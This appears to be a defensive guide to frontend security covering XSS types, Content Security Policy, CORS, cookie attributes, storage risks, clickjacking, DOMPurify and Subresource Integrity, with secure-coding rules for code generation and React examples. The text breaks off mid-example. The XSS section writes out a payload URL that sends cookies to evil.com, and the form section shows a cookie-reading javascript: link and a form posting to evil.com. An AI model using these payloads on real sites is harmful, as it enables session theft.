# Frontend Security
> XSS prevention, Content Security Policy, CORS, secure cookies, localStorage risks, iframe protection, input sanitization, and Subresource Integrity. The browser is a hostile environment — defend every surface.

---

## Principles

### 1. The Browser Threat Model

The frontend is inherently untrusted. Every line of JavaScript, every HTML template, every CSS rule you ship to the browser can be inspected, modified, and bypassed by anyone with a DevTools window. This is not a theoretical concern — it is the fundamental reality of client-side development. You do not control the execution environment. The user does. And so does any attacker who can inject code into that environment.

The same-origin policy is the browser's core security mechanism. It prevents scripts running on one origin (scheme + host + port) from reading data belonging to another origin. Without it, any website you visit could read your email from Gmail, steal your bank session, or exfiltrate your private messages. The same-origin policy is the reason the web works at all as a platform for sensitive applications. Every frontend security decision you make is either reinforcing this boundary or deliberately relaxing it.

What an attacker can do with a single JavaScript injection:

- Steal cookies and session tokens, forwarding them to an attacker-controlled server
- Redirect the user to a pixel-perfect phishing page that captures their credentials
- Modify the DOM in real time to insert fake login forms, fake error messages, or fake payment fields
- Exfiltrate every piece of data visible on the page — profile information, messages, financial records
- Install a keylogger that captures every keystroke the user types on the page
- Mine cryptocurrency using the user's CPU
- Make authenticated requests on behalf of the user — transfer money, change email, delete accounts
- Persist the attack by registering a Service Worker that intercepts all future requests

Defense-in-depth is non-negotiable. No single defense is perfect. CSP can be bypassed if misconfigured. Input sanitization can miss edge cases. HttpOnly cookies don't prevent all token theft. The correct approach is multiple overlapping defenses: CSP blocks injected scripts from executing, httpOnly cookies prevent JavaScript from reading session tokens even if a script does execute, input sanitization prevents malicious content from being stored in the first place, and SRI prevents tampered CDN scripts from loading. Each layer catches what the others miss.

The golden rule: never trust anything that comes from the browser. Not query parameters. Not form data. Not headers. Not cookies. Not localStorage values. Not URL fragments. Every piece of data originating from the client must be validated, sanitized, and treated as potentially hostile on the server. Client-side validation exists for user experience. Server-side validation exists for security.


### 2. Cross-Site Scripting (XSS): Reflected, Stored, DOM-Based

XSS is the most common web vulnerability and has persisted for over 25 years. It is number one on every web security list for good reason: it is easy to introduce, easy to exploit, and devastating in impact. If an attacker can execute JavaScript in the context of your application, they own that user's session.

Reflected XSS occurs when an attacker crafts a URL containing a malicious script in a query parameter, the server includes that parameter in the HTML response without encoding it, and the browser executes the script. The attack flow: the attacker sends the victim a link like `https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. The server renders a page saying "Results for: (malicious script here)." The browser parses the HTML, encounters the script tag, and executes it. The user's cookies are sent to the attacker's server. The attacker now has the user's session. This entire chain happens in milliseconds, invisibly.

Stored XSS is more dangerous because the attacker does not need to trick the victim into clicking a link. The attacker submits malicious script through a normal input — a forum post, a profile bio, a comment, a product review, a support ticket — and the application stores it in the database. Every user who views that content executes the script. A single stored XSS in a popular forum post can compromise thousands of accounts. Stored XSS is the reason input sanitization on write (before storage) is critical — not just sanitization on read (before rendering).

DOM-Based XSS is entirely a client-side vulnerability. The server never sees the malicious payload. The application's own JavaScript reads from an untrusted source and writes it to a dangerous sink. Untrusted sources include `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data, and Web Storage values. Dangerous sinks include `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout()` and `setInterval()` with string arguments, `new Function()`, `setAttribute()` on event handler attributes, and `location.href` assignment with user-controlled values.

The impact chain is predictable and severe: script injection leads to cookie theft, which leads to session hijacking, which leads to full account takeover. In applications that handle financial data, medical records, or personal information, a single XSS vulnerability can result in regulatory fines, lawsuits, and loss of user trust.

Understanding the three types matters because each requires different defenses. Reflected and stored XSS are primarily prevented by server-side output encoding. DOM-based XSS is prevented by careful client-side coding practices — avoiding dangerous sinks and using safe alternatives like `textContent` instead of `innerHTML`.


### 3. XSS Prevention Strategies

Output encoding is the primary defense against reflected and stored XSS. Before rendering any dynamic value in HTML, convert special characters to their HTML entity equivalents: `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`, `'` becomes `&#x27;`, and `/` becomes `&#x2F;`. These five characters are sufficient to prevent injection in most HTML contexts. The browser renders the entities as visible characters rather than interpreting them as HTML syntax.

Modern frontend frameworks provide auto-escaping by default, which is the single biggest improvement in XSS prevention over the past decade. React's JSX auto-escapes all expressions rendered in curly braces — if you write `{userInput}`, React converts any HTML special characters to entities before inserting them into the DOM. Vue's double-mustache syntax (`{{ }}`) does the same. Angular's template binding auto-escapes. Svelte's curly braces auto-escape. This means that the default behavior is safe — you have to go out of your way to introduce XSS.

The dangerous escape hatches exist because sometimes you genuinely need to render HTML (rich text editors, markdown content, email previews). React provides `dangerouslySetInnerHTML`, Vue provides `v-html`, Svelte provides `{@html}`, and Angular provides `[innerHTML]` binding. These bypass auto-escaping entirely. They are named to be scary on purpose. Every use of these features MUST be paired with sanitization — specifically DOMPurify.

DOMPurify is the industry standard library for HTML sanitization. It parses the input HTML into a DOM tree, walks every node and attribute, and removes anything dangerous — script tags, event handler attributes (`onerror`, `onclick`, `onload`), `javascript:` URLs, data URIs with executable content, SVG/MathML-based attacks, and dozens of other vectors. What remains is safe formatting: bold, italic, links, lists, headings, paragraphs. DOMPurify is battle-tested, actively maintained, and used by major applications including Google, Mozilla, and Salesforce.

Context-aware encoding is critical because different contexts require different encoding. HTML context requires HTML entity encoding. JavaScript string context requires JavaScript escaping (backslash-escaping quotes and special characters). URL context requires percent-encoding via `encodeURIComponent()`. CSS context requires CSS escaping. Applying HTML encoding inside a JavaScript string context does not prevent XSS — you need JavaScript-specific encoding. Most frameworks handle HTML context automatically, but URL and JavaScript contexts often require manual attention.

URL sanitization deserves special emphasis. Never allow user-provided URLs in `href` or `src` attributes without validating the protocol. The `javascript:` protocol in an anchor tag (`<a href="javascript:alert(1)">`) executes JavaScript when clicked. The `data:` protocol can embed executable content. Always validate that URLs begin with `https://`, `http://`, or `/` (relative URLs). Reject everything else.


### 4. Content Security Policy (CSP)

Content Security Policy is an HTTP response header that tells the browser exactly which sources of content are allowed to load and execute on a page. It is the single most powerful defense against XSS because it operates at the browser level — even if an attacker finds a way to inject a script tag into your HTML, CSP prevents the browser from executing it.

CSP works through directives, each controlling a specific type of resource:

| Directive | Controls | Recommended Value |
|---|---|---|
| `default-src` | Fallback for all resource types | `'self'` |
| `script-src` | JavaScript sources | `'self'` or nonce-based |
| `style-src` | CSS sources | `'self'` |
| `img-src` | Image sources | `'self'` and specific CDNs |
| `connect-src` | XHR, fetch, WebSocket endpoints | `'self'` and API domains |
| `font-src` | Web font sources | `'self'` or font CDNs |
| `frame-src` | Sources that can be loaded in iframes | `'none'` unless needed |
| `frame-ancestors` | Who can iframe YOUR page | `'none'` or `'self'` |
| `object-src` | Plugins (Flash, Java) | Always `'none'` |
| `base-uri` | Restricts the `<base>` tag | Always `'self'` |
| `form-action` | Where forms can submit | `'self'` |

Nonce-based CSP is the modern best practice for applications that require inline scripts. The server generates a cryptographically random nonce (at least 128 bits) for each HTTP request, includes it in the CSP header (`script-src 'nonce-abc123def456'`), and adds the same nonce attribute to every legitimate inline script tag (`<script nonce="abc123def456">`). An attacker who injects a script tag cannot guess the nonce, so the browser refuses to execute it. The nonce MUST be unique per request — reusing nonces defeats the purpose.

The `strict-dynamic` keyword is a game-changer for complex applications. When present in `script-src`, it tells the browser: "Trust any script that is loaded by a script I already trust." This means if your nonced bootstrap script dynamically loads other scripts (via `document.createElement('script')` or a module loader), those dynamically loaded scripts are automatically trusted. This dramatically simplifies CSP for applications that use code splitting, lazy loading, or third-party script loaders. With `strict-dynamic`, the browser ignores host-based allowlists (`https://cdn.example.com`) and only trusts the nonce chain.

Report-only mode is essential for safe CSP deployment. The `Content-Security-Policy-Report-Only` header applies the same rules but only reports violations — it does not block them. This lets you test a strict CSP in production without breaking your site. Violations are sent to the URL specified in the `report-uri` or `report-to` directive. Deploy in report-only mode first, monitor violations for at least a week, fix legitimate issues, then switch to enforcing mode.

CSP is not a substitute for input sanitization and output encoding. It is an additional layer. A well-configured CSP catches the XSS vectors that slip through your application-level defenses. Think of it as a seatbelt — you still drive carefully, but the seatbelt saves you when something unexpected happens.


### 5. Cross-Origin Resource Sharing (CORS)

CORS is the most misunderstood security concept in frontend development. The critical thing to understand is that CORS is NOT a security mechanism — it RELAXES security. The same-origin policy blocks cross-origin requests by default. CORS headers are the server's way of telling the browser: "I consent to this cross-origin request. Let the response through."

The browser categorizes cross-origin requests into two types. Simple requests — GET, HEAD, and POST with simple content types (`text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded`) and no custom headers — are sent immediately. The browser includes the `Origin` header, and the server responds with `Access-Control-Allow-Origin`. If the origin matches, the browser gives the response to JavaScript. If not, the browser blocks JavaScript from reading the response (the request was still sent — CORS does not prevent the request, only the response from being read).

Preflighted requests are everything else: PUT, DELETE, PATCH, requests with custom headers, requests with `application/json` content type. Before sending the actual request, the browser sends an OPTIONS request (the "preflight") asking: "Is this cross-origin request allowed?" The server responds with the allowed methods, headers, and origins. Only if the preflight succeeds does the browser send the actual request. This is why your API needs to handle OPTIONS requests.

Key CORS response headers and their purpose:

| Header | Purpose | Common Pitfall |
|---|---|---|
| `Access-Control-Allow-Origin` | Which origin is allowed | Using `*` with credentials |
| `Access-Control-Allow-Credentials` | Whether cookies/auth are sent | Must be `true` for auth'd requests |
| `Access-Control-Allow-Methods` | Which HTTP methods are allowed | Forgetting PATCH or DELETE |
| `Access-Control-Allow-Headers` | Which request headers are allowed | Forgetting `Authorization` or `Content-Type` |
| `Access-Control-Max-Age` | How long to cache the preflight | Not setting it (causes extra OPTIONS requests) |
| `Access-Control-Expose-Headers` | Which response headers JS can read | Custom headers invisible by default |

The most dangerous CORS misconfiguration is reflecting the `Origin` header back as `Access-Control-Allow-Origin`. This pattern appears in many tutorials and Stack Overflow answers: read the `Origin` header from the request, set it as the `Access-Control-Allow-Origin` value. This effectively allows ANY origin to make authenticated requests to your API, completely defeating the same-origin policy. The correct approach is maintaining an explicit allowlist of trusted origins and checking the request's `Origin` header against it.

When `Access-Control-Allow-Credentials: true` is set, the browser REQUIRES a specific origin in `Access-Control-Allow-Origin` — the wildcard `*` is not allowed. This is a deliberate safety mechanism. If you need credentials (cookies, Authorization headers), you must specify the exact origin.

If your frontend and API are on the same origin (same scheme, host, and port), you do not need CORS at all. This is the simplest and most secure configuration. Consider deploying your API behind the same domain as your frontend, using a reverse proxy (Nginx, Caddy) or a path-based routing setup.


### 6. Secure Cookie Attributes

Cookies are the primary mechanism for maintaining authentication state in web applications, and their security attributes are the difference between a robust session and a trivially hijackable one. Every authentication cookie MUST have the correct attributes set.

`HttpOnly` prevents JavaScript from accessing the cookie through `document.cookie`. This is the single most important cookie attribute for security. If an attacker achieves XSS, they cannot steal an HttpOnly cookie — they can make requests that include it (since the browser attaches it automatically), but they cannot read it, exfiltrate it, or use it on a different device. Every session cookie and every authentication token cookie MUST be HttpOnly. There is no legitimate reason for client-side JavaScript to read a session cookie.

`Secure` ensures the cookie is only sent over HTTPS connections. Without it, the cookie is sent in plaintext over HTTP, where it can be intercepted by anyone on the network (coffee shop Wi-Fi, compromised router, ISP-level interception). In production, every cookie should be Secure. In development, you may need to omit it for `localhost` over HTTP, but your production configuration must enforce it.

`SameSite` controls when the cookie is sent with cross-site requests, and it is the modern defense against Cross-Site Request Forgery (CSRF):

| Value | Behavior | Use Case |
|---|---|---|
| `Strict` | Never sent with cross-site requests | Maximum security, but breaks incoming links from other sites |
| `Lax` | Sent with top-level navigations (GET) only | Default in modern browsers, good balance of security and usability |
| `None` | Always sent cross-site (requires `Secure`) | Third-party cookies, cross-site APIs, embedded widgets |

`Lax` is the recommended default. It prevents CSRF on POST requests (the attacker cannot submit a form cross-site that includes the cookie) while still allowing users to click links to your site and arrive logged in. `Strict` is more secure but breaks flows where users navigate to your site from external links — they arrive logged out and must re-authenticate.

Cookie prefixes add an extra layer of enforcement that cannot be overridden. `__Host-` is the strictest: the cookie must have the `Secure` flag, must NOT have a `Domain` attribute, and must have `Path=/`. This prevents a subdomain from overwriting the cookie (subdomain takeover attacks). `__Secure-` requires only the `Secure` flag. For session cookies, always use the `__Host-` prefix when your application architecture allows it.

The recommended authentication cookie configuration: `__Host-session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400`. This gives you HttpOnly (no JavaScript access), Secure (HTTPS only), SameSite=Lax (CSRF protection), Path=/ (available site-wide), the `__Host-` prefix (no subdomain override), and a reasonable expiry.


### 7. localStorage and sessionStorage Risks

localStorage is the most overused and most dangerous storage mechanism in frontend development. It is a synchronous, unencrypted, key-value store that is accessible to ANY JavaScript running on the page — your code, third-party scripts, analytics libraries, browser extensions with page access, and any script injected through XSS.

If there is a single XSS vulnerability anywhere in your application, an attacker can execute `JSON.stringify(localStorage)` and exfiltrate everything stored there in one line. This is not a theoretical concern — it is one of the most common attack patterns in real-world XSS exploitation. The attacker does not need to know what keys you use or what format the data is in. They dump everything and sort it out later.

What MUST NOT be stored in localStorage or sessionStorage:

- Authentication tokens (JWTs, access tokens, refresh tokens)
- Session identifiers
- API keys or client secrets
- Personally identifiable information (PII)
- Credit card numbers or financial data
- CSRF tokens
- Any data that would cause harm if exposed

What IS acceptable to store in localStorage:

- User preferences (theme, language, timezone)
- Non-sensitive UI state (sidebar collapsed, last viewed tab)
- Cached non-sensitive data (public API responses, product catalogs)
- Shopping cart contents for anonymous users
- Feature flags (non-security-relevant)

sessionStorage is slightly better than localStorage because it is scoped to a single tab and cleared when the tab closes. However, it is equally vulnerable to XSS — any script running on the page can read it. The tab scoping provides no security benefit against injection attacks.

The correct alternative for authentication tokens is httpOnly cookies. An httpOnly cookie is invisible to JavaScript (`document.cookie` does not include it), sent automatically by the browser with every request to the cookie's domain, and protected from XSS exfiltration. The trade-off is that you need server-side session management or a backend-for-frontend (BFF) pattern to handle token exchange — but this trade-off is worth it.

If you absolutely must store a token client-side (e.g., for a pure SPA with no backend-for-frontend), consider using a service worker to intercept requests and attach the token from an in-memory variable. In-memory storage (a JavaScript variable) is not persistent across page reloads but is significantly harder to exfiltrate than localStorage because it requires more sophisticated XSS exploitation.


### 8. Iframe Protection

Clickjacking is the primary iframe-related threat. The attack is simple and effective: an attacker creates a page that loads your application in a transparent iframe, positions it so that a sensitive button (like "Transfer $1,000" or "Delete Account") is directly under the user's cursor, and overlays their own visible UI with a call to action ("Click here to claim your prize!"). The user thinks they are clicking the attacker's button, but they are actually clicking yours. The request succeeds because the user is authenticated and the click is real.

The `X-Frame-Options` HTTP header was the original defense against clickjacking. It has two useful values: `DENY` (no one can iframe your page, including yourself) and `SAMEORIGIN` (only pages on the same origin can iframe you). It is still widely supported but has limitations — it cannot specify multiple allowed origins, and it is not part of any formal standard.

CSP's `frame-ancestors` directive is the modern replacement and is strictly more capable. `frame-ancestors 'none'` is equivalent to `X-Frame-Options: DENY`. `frame-ancestors 'self'` is equivalent to `SAMEORIGIN`. But `frame-ancestors` also supports specific origins: `frame-ancestors 'self' https://partner.com https://other-partner.com`. This is essential for applications that need to be embedded by specific partners (payment forms, video players, chat widgets) while blocking everyone else.

For maximum compatibility, set BOTH headers: `X-Frame-Options: DENY` (or `SAMEORIGIN`) and `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`). Older browsers that do not support CSP will fall back to `X-Frame-Options`.

When you intentionally embed third-party content in your own page via iframes, the `sandbox` attribute restricts what the framed content can do. Without `sandbox`, the iframe has full capabilities. With `sandbox` (no value), the iframe is maximally restricted — no scripts, no forms, no navigation, no popups. You selectively re-enable capabilities: `sandbox="allow-scripts allow-same-origin"` allows scripts and cookie access. Common sandbox values:

- `allow-scripts` — lets the iframe run JavaScript
- `allow-forms` — lets the iframe submit forms
- `allow-same-origin` — lets the iframe access its own cookies (needed for authenticated embeds)
- `allow-popups` — lets the iframe open new windows
- `allow-top-navigation` — lets the iframe navigate the parent page (dangerous — usually omit this)

Never combine `allow-scripts` and `allow-same-origin` on an iframe that loads untrusted content — the script can remove the sandbox attribute from its own iframe.


### 9. Input Sanitization with DOMPurify

There are legitimate cases where you must render user-provided HTML. Rich text editors (Tiptap, Slate, ProseMirror, CKEditor, Quill) produce HTML output. Markdown rendered to HTML contains formatting tags. Email content viewers display HTML emails. Content management systems store and render rich content. In all these cases, you need sanitization — not escaping, because escaping would destroy the formatting.

DOMPurify is the standard solution. It works by parsing the input HTML into a DOM tree (using the browser's built-in HTML parser or, on the server, a DOM implementation like `jsdom`), walking every element and attribute, and removing anything that could execute code. This includes script tags, event handler attributes (over 80 of them: `onerror`, `onclick`, `onload`, `onmouseover`, `onfocus`, and many more), `javascript:` URLs, `data:` URIs with executable MIME types, SVG-based script injection, MathML-based injection, CSS `expression()`, and meta tag redirects.

DOMPurify's default configuration is deliberately aggressive — it strips anything remotely dangerous. For most use cases, you should restrict it further with an explicit allowlist. A good starting configuration allows these tags: `b`, `i`, `em`, `strong`, `a`, `p`, `br`, `ul`, `ol`, `li`, `h1`, `h2`, `h3`, `h4`, `blockquote`, `code`, `pre`, `img`. And these attributes: `href`, `src`, `alt`, `target`, `rel`, `class`. Everything else is stripped. The smaller the allowlist, the smaller the attack surface.

The dual-sanitization pattern is critical: sanitize on the server before storing in the database (primary defense, prevents stored XSS) AND sanitize on the client before rendering (defense-in-depth, protects against database compromise, legacy unsanitized data, or bugs in server-side sanitization). Server-side sanitization uses DOMPurify with `jsdom` providing the DOM implementation since Node.js does not have a native DOM. Client-side sanitization uses DOMPurify directly in the browser.

For markdown specifically, use a sanitizing rendering pipeline. The most robust approach in the JavaScript ecosystem is the unified/remark/rehype pipeline: parse markdown with `remark-parse`, convert to HTML AST with `remark-rehype`, sanitize the HTML AST with `rehype-sanitize` (which uses a GitHub-style schema by default), and stringify to HTML with `rehype-stringify`. This sanitizes at the AST level before the HTML is even generated, which is more robust than sanitizing the final HTML string.

Never write your own sanitizer. HTML parsing is extraordinarily complex, with hundreds of edge cases around tag nesting, attribute parsing, encoding, and browser-specific quirks. Every custom sanitizer ever written has had bypasses discovered. DOMPurify has had years of security review, fuzzing, and real-world testing. Use it.


### 10. Subresource Integrity (SRI)

Subresource Integrity protects against compromised CDNs. When you load a JavaScript file or CSS stylesheet from a third-party CDN, you are trusting that CDN to serve the correct, unmodified file. If the CDN is compromised (it has happened: the British Airways breach, the event-stream incident, the ua-parser-js attack), the attacker can modify the file to include malicious code, and every site loading that file will execute it.

SRI works by including a cryptographic hash of the expected file contents in the HTML tag. The browser downloads the file, computes its hash, and compares it to the expected hash. If they match, the file executes. If they do not match, the browser refuses to execute it and reports an error. The hash format is the algorithm name followed by a Base64-encoded digest: `sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC`.

SHA-384 is the recommended algorithm — it provides a strong security guarantee without the overhead of SHA-512, and `sha256` is considered the minimum. You can include multiple hashes for fallback: `integrity="sha384-hash1 sha512-hash2"`. The browser will accept the file if ANY of the listed hashes match.

The `crossorigin="anonymous"` attribute is REQUIRED on any tag with an `integrity` attribute when loading from a different origin. Without it, the browser cannot perform the integrity check because CORS prevents it from reading the response body. This attribute tells the browser to make the request without credentials and to require CORS headers from the server (which all legitimate CDNs provide).

When SRI is essential: any script or stylesheet loaded from a domain you do not control. This includes jQuery from a CDN, Bootstrap from a CDN, analytics libraries, payment SDKs, and any other third-party code. When SRI is not needed: files served from your own domain — you control those files and can verify their integrity through your deployment process.

Build tool integration makes SRI practical for production. The `webpack-subresource-integrity` plugin automatically generates SRI hashes for all emitted assets and adds them to the HTML. Vite and Next.js can be configured to include SRI attributes in production builds. For static HTML, you can generate hashes at build time using OpenSSL (`openssl dgst -sha384 -binary file.js | openssl base64 -A`) or the Node.js `ssri` package.

SRI has one operational caveat: if the CDN updates the file (even for a bug fix), the hash will no longer match and the file will be blocked. This is a feature, not a bug — you want to know when a file changes. Pin your CDN URLs to specific versions (`/lib@1.2.3/file.js`, not `/lib@latest/file.js`) to prevent unexpected breakage.


### 11. Form Security

Forms are the primary interface for user input, and they come with their own set of security considerations beyond XSS.

The `autocomplete` attribute controls browser autofill behavior. For password creation fields, use `autocomplete="new-password"` — this tells the browser to offer to generate a strong password rather than filling in a saved one. For login fields, use `autocomplete="current-password"`. For one-time codes (2FA, email verification), use `autocomplete="one-time-code"` — on mobile, this enables automatic OTP detection from SMS. For sensitive fields that should never be autofilled (account numbers in admin tools, for example), use `autocomplete="off"`, though be aware that some browsers ignore this for credential fields.

External links opened with `target="_blank"` historically created a security vulnerability. The opened page could access `window.opener` — a reference to the page that opened it — and redirect it to a phishing page. The user returns to what they think is your site but is actually a fake login page. The fix is `rel="noopener noreferrer"`. The `noopener` attribute prevents the opened page from accessing `window.opener`. The `noreferrer` attribute additionally prevents the Referer header from being sent. Modern browsers (Chrome 88+, Firefox 79+, Safari) default to `noopener` behavior for `target="_blank"`, but you should still set it explicitly for older browser support and code clarity.

CSP's `form-action` directive restricts where forms can submit data. Without it, an attacker who achieves HTML injection (even without script execution) can insert a form with `action="https://evil.com/steal"` that captures user input. `form-action 'self'` restricts forms to only submit to your own origin.

The `javascript:` protocol in URLs is a persistent attack vector. If your application allows users to set a URL (profile link, website field, redirect URL), and you render it as an `href` attribute, the user can set it to `javascript:alert(document.cookie)`. When another user clicks the link, the JavaScript executes. Always validate URLs before rendering them in `href` attributes. Allow `https:`, `http:`, `mailto:`, and relative URLs starting with `/`. Reject `javascript:`, `data:`, `vbscript:`, and any protocol you do not explicitly recognize.

CSRF tokens remain relevant for traditional server-rendered forms. While `SameSite=Lax` cookies provide good CSRF protection for modern browsers, older browsers do not support `SameSite`. A synchronizer token pattern — generating a random token per session, embedding it in a hidden form field, and validating it on the server — provides defense-in-depth. For SPAs using fetch/XHR, the combination of `SameSite=Lax` cookies and requiring a custom header (like `X-Requested-With`) is typically sufficient.

---

## LLM Instructions

### Preventing XSS in React, Vue, and Svelte

When generating frontend code, NEVER use `dangerouslySetInnerHTML` in React, `v-html` in Vue, or `{@html}` in Svelte with unsanitized user input. These APIs bypass the framework's built-in auto-escaping and inject raw HTML into the DOM. If a task requires rendering user-provided HTML, ALWAYS import and apply DOMPurify before passing the HTML to these APIs. The sanitization call should happen immediately before rendering, not at some earlier point in the pipeline where the sanitized value might be modified. Wrap the pattern in a dedicated component — a `SafeHTML` component that accepts raw HTML and sanitizes it internally — so that DOMPurify usage is centralized and auditable.

For rendering user-provided text content (names, comments, descriptions), use JSX auto-escaping in React by placing the value in curly braces: `{userName}`. In Vue, use the double-mustache syntax: `{{ userName }}`. In Svelte, use curly braces: `{userName}`. These are safe by default. Do NOT convert text content to HTML for rendering — that introduces unnecessary risk.

When dealing with URLs from user input — profile links, redirect targets, custom URLs — validate the protocol before rendering in `href` or `src` attributes. Build a URL validation utility that parses the URL, checks that the protocol is `https:` or `http:` (or a relative path starting with `/`), and returns a safe default (like `#` or `about:blank`) if validation fails. Apply this utility at the point of rendering, not just at the point of input. For dynamic URL components (search parameters, path segments), encode them with `encodeURIComponent()` to prevent injection into the URL structure.

When generating React components that display user-generated content alongside interactive elements, use `textContent` or React's built-in escaping. Never construct HTML strings and inject them. Never use `eval()`, `new Function()`, `setTimeout()` with string arguments, or `document.write()` in any generated code.


### Configuring Content Security Policy

When generating server configuration or middleware, always include a Content Security Policy header. Start with the strictest baseline: `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'`. This baseline blocks all external resources and all inline scripts.

Then add exceptions based on the specific application's requirements. If the application uses Google Fonts, add `https://fonts.googleapis.com` to `style-src` and `https://fonts.gstatic.com` to `font-src`. If the application calls an external API, add the API domain to `connect-src`. If the application loads images from a CDN, add the CDN domain to `img-src`. Each exception should be the most specific origin possible — never use wildcards like `*.example.com` unless absolutely necessary.

For applications with inline scripts (common in server-rendered frameworks like Next.js), implement nonce-based CSP. Generate a cryptographically random nonce in the middleware or server handler, add it to the CSP header as `script-src 'nonce-VALUE' 'strict-dynamic'`, and pass the nonce to the page renderer so it can be added to script tags. The `strict-dynamic` keyword allows dynamically loaded scripts (code splitting, lazy loading) to execute without individual nonces.

Always deploy CSP in report-only mode first. Use the `Content-Security-Policy-Report-Only` header during the testing phase and configure a report endpoint to collect violations. Only switch to the enforcing `Content-Security-Policy` header after confirming that no legitimate functionality is blocked. For Next.js applications, configure CSP in the middleware file. For Express applications, use the `helmet` middleware with a custom CSP configuration. For static sites, use the meta tag equivalent as a fallback, but prefer HTTP headers because meta tags do not support `frame-ancestors` or `report-uri`.


### Setting Up CORS Correctly

When generating API server code, configure CORS with an explicit origin allowlist. Store allowed origins in environment variables as a comma-separated string. In the CORS middleware configuration, parse this string into an array and use a custom origin function that checks the incoming `Origin` header against the array. If the origin is in the list, reflect it back as `Access-Control-Allow-Origin`. If it is not, reject the request or omit the CORS headers.

NEVER set `Access-Control-Allow-Origin: *` when the API handles authentication or uses cookies. The wildcard is only acceptable for truly public APIs that serve non-sensitive data without authentication — like a public weather API or a static asset server. If the API requires authentication (cookies, JWTs, API keys), the origin must be specific.

For development environments, include `http://localhost:3000` (or whatever port the development server uses) in the allowlist. For production, only include the production frontend domain. Use environment-specific configuration so that development origins are never present in production.

Handle preflight caching by setting `Access-Control-Max-Age` to a reasonable value (3600 seconds is common). This prevents the browser from sending a preflight OPTIONS request before every API call, improving performance. Ensure the server responds correctly to OPTIONS requests — many API frameworks need explicit configuration to handle this.

When the frontend and API are on the same origin (same scheme, host, and port), do not configure CORS at all. Same-origin requests are not subject to CORS restrictions. Deploying the API behind a reverse proxy on the same domain as the frontend is the simplest way to avoid CORS complexity entirely.


### Implementing Secure Cookie Settings

When generating authentication code that sets cookies, always include all four essential security attributes. Set `HttpOnly` to true — there is no case where client-side JavaScript needs to read a session cookie. Set `Secure` to true in production — always send auth cookies over HTTPS. Set `SameSite` to at least `Lax` — this provides CSRF protection with minimal usability impact. Set `Path` to `/` so the cookie is available across all routes.

Use the `__Host-` prefix for session cookies whenever the application does not need subdomain cookie sharing. The `__Host-` prefix enforces `Secure`, prevents `Domain` from being set, and requires `Path=/`. This protects against subdomain takeover attacks where a compromised subdomain overwrites the parent domain's cookies.

Set an appropriate expiry using `maxAge` or `expires`. For session cookies, 24 hours to 7 days is typical. For "remember me" functionality, 30 days is common. Never set indefinite expiry on authentication cookies. For refresh tokens stored in cookies, consider shorter expiry with silent refresh.

When generating logout functionality, clear authentication cookies by setting their value to empty and their `maxAge` to 0 (or `expires` to a date in the past). Ensure the `Path`, `Domain`, `Secure`, and `SameSite` attributes match the original cookie — a cookie can only be cleared if the clearing attempt has the same attributes.

For applications that need cross-site cookies (embedded widgets, third-party authentication providers), use `SameSite=None; Secure`. Document why each cross-site cookie is necessary, because `SameSite=None` significantly reduces CSRF protection.


### Handling User-Generated Content

When generating code that handles user-generated content (comments, posts, profiles, messages), implement dual sanitization. On the server, before storing the content in the database, sanitize it with DOMPurify using `jsdom` as the DOM implementation. On the client, before rendering the content, sanitize it again with DOMPurify in the browser. This dual-layer approach protects against stored XSS even if one layer is bypassed or if legacy unsanitized data exists in the database.

For content that should be plain text (usernames, single-line inputs, search queries), do not sanitize — escape. Replace all HTML special characters with entities before rendering. Or, better, use the framework's auto-escaping by rendering the value as a text node, not as HTML.

For markdown content, use a sanitizing rendering pipeline. In the Node.js ecosystem, the preferred approach is the unified pipeline: parse the markdown with `remark-parse`, convert the AST to HTML AST with `remark-rehype`, sanitize the HTML AST with `rehype-sanitize` using a strict schema, and stringify to safe HTML with `rehype-stringify`. This approach sanitizes at the abstract syntax tree level, which is more thorough than sanitizing the final HTML string.

For URLs submitted by users (profile links, website fields, redirect targets), validate the protocol on both the client and the server. Allow `https:`, `http:`, and `mailto:` protocols. Reject `javascript:`, `data:`, `vbscript:`, and `blob:` protocols. Parse the URL using the `URL` constructor, check the `protocol` property, and return a safe fallback if validation fails. Store the validated URL, not the raw input.

---

## Examples

### 1. XSS Prevention Patterns (React + DOMPurify)

Safe text rendering using JSX auto-escaping, which handles HTML entity encoding automatically:

```tsx
// Safe: React auto-escapes all string expressions in JSX
interface UserCommentProps {
  author: string;
  content: string;
  avatarUrl: string;
}

function UserComment({ author, content, avatarUrl }: UserCommentProps) {
  return (
    <div className="comment">
      <img src={sanitizeUrl(avatarUrl)} alt={author} />
      <strong>{author}</strong>
      <p>{content}</p> {/* Safe — auto-escaped */}
    </div>
  );
}
```

DANGEROUS pattern with `dangerouslySetInnerHTML` and the correct fix using DOMPurify:

```tsx
import DOMPurify from "dompurify";

// DANGEROUS — never do this with unsanitized input
function UnsafeRichContent({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// SAFE — sanitize with DOMPurify before rendering
function SafeRichContent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      "b", "i", "em", "strong", "a", "p", "br",
      "ul", "ol", "li", "h1", "h2", "h3", "h4",
      "blockquote", "code", "pre", "img",
    ],
    ALLOWED_ATTR: ["href", "src", "alt", "target", "rel", "class"],
    ALLOW_DATA_ATTR: false,
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Reusable SafeHTML component — centralize DOMPurify usage
interface SafeHTMLProps {
  html: string;
  className?: string;
  allowedTags?: string[];
}

function SafeHTML({ html, className, allowedTags }: SafeHTMLProps) {
  const config: DOMPurify.Config = {
    ALLOWED_TAGS: allowedTags ?? [
      "b", "i", "em", "strong", "a", "p", "br",
      "ul", "ol", "li", "h1", "h2", "h3",
      "blockquote", "code", "pre",
    ],
    ALLOWED_ATTR: ["href", "target", "rel", "class"],
    ALLOW_DATA_ATTR: false,
  };

  const sanitized = DOMPurify.sanitize(html, config);

  return (
    <div
      className={className}
